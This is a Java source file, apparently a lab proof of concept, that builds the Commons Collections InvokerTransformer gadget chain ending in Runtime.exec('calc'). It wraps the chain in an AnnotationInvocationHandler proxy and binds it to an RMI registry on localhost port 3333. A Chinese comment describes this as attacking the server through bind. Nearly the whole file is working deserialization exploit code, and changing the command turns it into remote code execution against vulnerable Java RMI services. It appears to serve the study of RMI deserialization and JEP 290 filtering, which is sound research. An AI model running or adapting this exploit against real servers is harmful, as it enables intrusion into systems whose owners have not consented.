package jep290;
//使用高版本jdk
import RMI.User;
import RMI.UserImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class UserServerEval {
    public static void main(String[] args)  {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class},
                            new Object[]{"calc"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "Threezh1");
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
            Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject));
            Registry registry = LocateRegistry.createRegistry(3333);
            Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 3333);
            User a = new UserImpl();

            registry.bind("HelloRegistry", proxyEvalObject);  //利用bind攻击服务端
            registry.bind("user", a);
           // registry_remote.bind("HelloRegistry", proxyEvalObject);
            registry_remote.lookup("HelloRegistry");
            System.out.println("rmi start at 3333");
        }catch (Exception e)
        {
            System.out.println("We got unexpected:" + e.getMessage());

            System.out.println("We got unexpected:" + e.getLocalizedMessage());
        }
    }

}